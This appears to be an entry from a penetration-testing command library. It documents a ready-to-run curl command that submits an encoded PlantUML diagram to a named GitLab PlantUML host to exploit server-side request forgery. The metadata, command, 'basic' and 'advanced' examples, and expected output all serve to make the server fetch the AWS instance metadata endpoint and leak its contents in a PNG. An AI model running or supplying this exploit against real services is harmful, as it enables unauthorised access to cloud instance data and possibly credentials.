---
id: cmd-plantuml-ssrf-metadata
data: >-
  curl
  "https://plantuml.pre.gitlab.com/png/Aov9B2hXKW02AvTyXUByt5I5ufBIj3Hhi9XYPbvoJcbAga96IKc1bRw-eP6vdW4G6bfP65WOw7CLb-GNM0C0"
  -o output.png
tags:
  - ssrf
  - aws
  - metadata
type: command
output: PNG file with potentially embedded AWS metadata or timeout error
executor: bash
platforms:
  - Web
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.482Z'
verified: false
validated: true
submitted: true
---
# plantuml-ssrf-aws-metadata

## Command

```bash
curl "https://plantuml.pre.gitlab.com/png/Aov9B2hXKW02AvTyXUByt5I5ufBIj3Hhi9XYPbvoJcbAga96IKc1bRw-eP6vdW4G6bfP65WOw7CLb-GNM0C0" -o output.png
```

## Description

Submits an encoded PlantUML diagram exploiting SSRF by including the AWS instance metadata endpoint (http://169.254.169.254/), causing the server to fetch internal data and incorporate it into the PNG output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -o | Output file for the PNG | No |
| URL | Encoded PNG submission endpoint with SSRF payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://plantuml.pre.gitlab.com/png/Aov9B2hXKW02AvTyXUByt5I5ufBIj3Hhi9XYPbvoJcbAga96IKc1bRw-eP6vdW4G6bfP65WOw7CLb-GNM0C0" -o output.png
```

### Advanced Usage

```bash
curl -s "https://plantuml.pre.gitlab.com/png/[ENCODED_SSRF]" -o metadata.png && file metadata.png
```

## Expected Output

Binary PNG file; upon inspection (e.g., strings output.png), it may contain AWS metadata JSON like {"instance-id": "i-1234567890abcdef0"} if successful, or a timeout/error if restricted.

## Related

- [[commands/plantuml-submit-basic-include]]
- [[procedures/Exploit-SSRF-via-PlantUML-Include-Directive]]
